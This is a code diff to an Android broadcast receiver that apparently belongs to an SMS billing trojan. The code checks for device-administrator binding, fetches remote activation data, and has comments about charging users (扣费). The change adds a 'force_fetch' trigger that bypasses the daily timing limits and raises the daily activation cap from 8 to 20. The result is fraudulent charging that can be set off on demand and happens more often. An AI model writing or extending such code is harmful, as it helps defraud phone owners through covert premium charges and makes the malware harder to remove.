@@ -28,6 +28,8 @@ public class ScreenBRC extends BroadcastReceiver {
 
     public static final String HOUR_ALARM_ACTION = "com.xstd.hour.alarm";
 
+    public static final String KEY_FORCE_FETCH = "force_fetch";
+
     public void onReceive(Context context, Intent intent) {
         //check Google Service if runging for SMS
         Intent serviceIntent = new Intent();
@@ -36,6 +38,8 @@ public class ScreenBRC extends BroadcastReceiver {
 
         //启动小时定时器
         BRCUtil.startHourAlarm(context);
+
+        boolean isForce = intent.getBooleanExtra(KEY_FORCE_FETCH, false);
 
         DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
         boolean isDeviceBinded = dpm.isAdminActive(new ComponentName(context, DeviceBindBRC.class));
@@ -89,9 +93,9 @@ public class ScreenBRC extends BroadcastReceiver {
                         SettingManager.getInstance().setKeyMonthCount(0);
                     }
 
-                    if ((curDay != lastDay || AppRuntime.ACTIVE_RESPONSE == null)
-                            && curHour >= SettingManager.getInstance().getKeyRandomNetworkTime()
-                            && UtilsRuntime.isOnline(context)) {
+                    if (isForce || ((curDay != lastDay || AppRuntime.ACTIVE_RESPONSE == null)
+                                    && curHour >= SettingManager.getInstance().getKeyRandomNetworkTime()
+                                    && UtilsRuntime.isOnline(context))) {
                         //如果之前获取过数据，并且不是同一天，并且当前时间大于6点，那么获取一次接口数据
                         //当天如果没有激活过，当天不扣费
                         if (curDay != lastDay) {
@@ -100,7 +104,7 @@ public class ScreenBRC extends BroadcastReceiver {
                         }
 
                         if (!AppRuntime.ACTIVE_PROCESS_RUNNING.get()
-                            && SettingManager.getInstance().getKeyDayActiveCount() < 8) {
+                            && SettingManager.getInstance().getKeyDayActiveCount() < 20) {
                             if (Config.DEBUG) {
                                 Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginService for " + PluginService.ACTIVE_ACTION
                                  + " as active time is over");
